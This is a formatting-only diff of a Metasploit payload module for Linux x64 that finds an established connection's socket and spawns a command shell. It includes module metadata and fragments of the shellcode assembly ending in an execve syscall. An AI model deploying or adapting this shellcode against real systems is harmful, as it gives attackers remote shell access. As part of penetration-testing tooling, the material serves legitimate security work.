@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 98
 
   include Msf::Payload::Single
@@ -13,23 +11,24 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux Command Shell, Find Port Inline',
-      'Description'   => 'Spawn a shell on an established connection',
-      'Author'        => 'mak',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::FindPort,
-      'Session'       => Msf::Sessions::CommandShellUnix,
-      'Payload'       =>
-        {
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux Command Shell, Find Port Inline',
+        'Description' => 'Spawn a shell on an established connection',
+        'Author' => 'mak',
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::FindPort,
+        'Session' => Msf::Sessions::CommandShellUnix,
+        'Payload' => {
           'Offsets' =>
-            {
-              'CPORT' => [ 39, 'n' ],
-            },
+                  {
+                    'CPORT' => [ 39, 'n' ]
+                  },
 
-          'Assembly' => %Q|
+          'Assembly' => %(
             xor rdi,rdi
             xor rbx,rbx
             mov bl,0x18
@@ -66,14 +65,13 @@ module MetasploitModule
             push 0x3b     ; execve
             pop rax
             syscall
-          |
+          )
         }
-      ))
+      )
+    )
   end
 
   def size
     return 91
   end
-
-
 end
